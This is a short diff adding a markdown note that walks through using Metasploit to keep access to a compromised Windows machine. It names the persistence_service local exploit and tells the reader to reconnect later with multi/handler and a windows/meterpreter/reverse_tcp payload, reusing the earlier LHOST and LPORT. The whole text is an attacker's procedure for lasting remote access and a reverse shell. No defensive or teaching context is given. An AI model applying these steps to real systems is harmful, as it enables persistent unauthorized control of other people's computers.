@@ -1,0 +1,11 @@
+
+__To use this script you need to have access to the target system__
+- __`search persistence_service`__
+  - __`use exploit/windows/local/persistence_service`__
+  - __remember the `LPORT` because we use same port to login__
+  - __when you got successfully got persistence service then you can access the target anytime__
+  - __So when you load the msfconsole do this things__
+  - __`use multi/handler`__
+  - __`set payload windows/meterpreter/reverse_tcp`__
+  - > __You should use the same payload that you used before__
+  - __set the `LHOST` and `LPORT` that you used before__
